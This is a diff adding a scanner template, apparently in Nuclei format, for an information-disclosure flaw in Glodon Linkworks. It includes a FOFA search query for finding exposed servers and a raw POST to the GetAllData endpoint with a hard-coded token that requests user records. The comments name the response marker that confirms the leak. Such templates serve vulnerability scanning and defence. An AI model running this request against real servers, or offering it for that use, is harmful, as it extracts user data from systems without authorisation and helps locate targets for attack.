@@ -1,0 +1,51 @@
+id: poc-btp8skf29ny7hypt
+info:
+  name: 广联达Linkworks GetAllData 信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/btp8skf29ny7hypt'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: btp8skf29ny7hypt
+    fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+http:
+- raw:
+  - 'POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: keep-alive
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    Token=!@#$asdf$#@!&DataType=user
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    USR_CODE
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
